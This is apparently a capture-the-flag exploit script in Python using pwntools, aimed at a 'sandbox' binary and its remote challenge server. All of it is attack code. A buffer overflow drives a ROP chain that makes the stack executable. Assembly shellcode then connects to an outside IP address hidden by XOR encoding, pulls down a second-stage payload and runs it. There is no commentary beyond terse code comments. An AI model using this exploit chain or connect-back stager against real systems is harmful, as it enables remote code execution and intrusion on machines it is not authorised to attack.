from pwn import *
import time
import sys

def sandbox(DEBUG):
	if DEBUG=="1":
		offset_one_gadget = 0xf02a4 # [rsp+0x50]
		r = process(["./sandbox","./program"])
		raw_input("debug?")
	elif DEBUG=="2":
		offset_one_gadget = 0xf02a4 # [rsp+0x50]
		r = process("./program")
		raw_input("debug?")
	elif DEBUG=="3":
		# offset_one_gadget = 0x4647c # [rsp+0x30]
		offset_one_gadget = 0xe9415 # [rsp+0x50]
		# offset_one_gadget = 0xea36d # [rsp+0x70]
		HOST = 'sandbox.chung96vn.cf'
		PORT = 1337
		r = remote(HOST,PORT)
	
	def pause():
		# time.sleep(0.05)
		raw_input("?")
		
	context.arch = "amd64"
	pop_rax_rdx_rbx = 0x4816b6 # pop rax ; pop rdx ; pop rbx ; ret
	mov_dword_rdx_rax = 0x417e08 # mov dword ptr [rdx], eax ; ret
	pop_rdi = 0x400686
	call_rsp = 0x44a1d1
	
	__stack_prot = 0x6B8EF0
	__libc_stack_end = 0x6B8AB0
	_dl_make_stack_executable = 0x47F780
	
	shellcode = ""
	shellcode += asm("""    /* open new socket */
    /* call socket(2, Constant('SOCK_STREAM', 0x1), 0) */
    push SYS_socket /* 0x29 */
    pop rax
    push 2
    pop rdi
    push SOCK_STREAM /* 1 */
    pop rsi
    cdq /* rdx=0 */
    syscall

    /* Put socket into rbp */
    mov rbp, rax

    /* Create address structure on stack */
    /* push '\x02\x00\x04\xd2\x7f\x00\x00\x01' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x3cc6881239050002
    xor [rsp], rax

    /* Connect the socket */
    /* call connect('rbp', 'rsp', 16) */
    push SYS_connect /* 0x2a */
    pop rax
    mov rdi, rbp
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall
	
	mov rdx, 0x200
	syscall
	""")
	"""
	pwnlib.shellcraft.amd64.linux.connect("18.136.198.60", 1337)
	sys_read(fd, rsp, 0x200)
	"""
	
	payload = "A"*0x30
	payload += "B"*8
	payload += p64(pop_rax_rdx_rbx)
	payload += p64(7) # rax
	payload += p64(__stack_prot) # rdx
	payload += p64(0) # rbx
	payload += p64(mov_dword_rdx_rax)
	payload += p64(pop_rdi)
	payload += p64(__libc_stack_end)
	payload += p64(_dl_make_stack_executable)
	payload += p64(call_rsp)
	payload += shellcode
	
	r.send(payload)
	
	
	r.interactive()

sandbox(sys.argv[1])